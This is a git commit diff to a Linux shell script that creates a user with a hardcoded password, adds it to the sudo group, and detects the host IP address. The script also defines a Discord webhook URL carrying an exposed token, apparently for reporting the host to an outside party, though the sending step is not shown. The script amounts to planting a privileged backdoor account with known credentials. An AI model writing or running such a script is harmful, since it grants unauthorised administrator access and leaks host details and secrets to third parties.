a830cdccb07ac42b9114bb2e41c185526239ec63
Corazon <41511738+assafgold1@users.noreply.github.com>
2024-08-03 04:59:24 +0300

    Update create_user_linux.sh

--- create_user_linux.sh
+++ create_user_linux.sh
@@ -4,12 +4,15 @@
 USERNAME="nano"
 PASSWORD="Mizi123!"
 DISCORD_WEBHOOK_URL="https://discord.com/api/webhooks/1269088317715255296/0pnxttnfuBBlzo-n0d_yoQswurNWjosz__HKVLxxg-Okdrbpvg1BQkLUe1vE25Ohl0N5"
+
+# Create the user
 sudo useradd -m -p $(openssl passwd -1 $PASSWORD) $USERNAME
 
+# Add the user to the 'sudo' group
 sudo usermod -aG sudo $USERNAME
 
-# Get the local IP address (replace eth0 with the correct interface name if needed)
-IP_ADDRESS=$(ip a show eth0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
+# Get the local IP address (replace ens33 with the correct interface name)
+IP_ADDRESS=$(ip a show ens33 | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
 
 # Debug: Print the IP address to verify
 echo "Detected IP Address: $IP_ADDRESS"
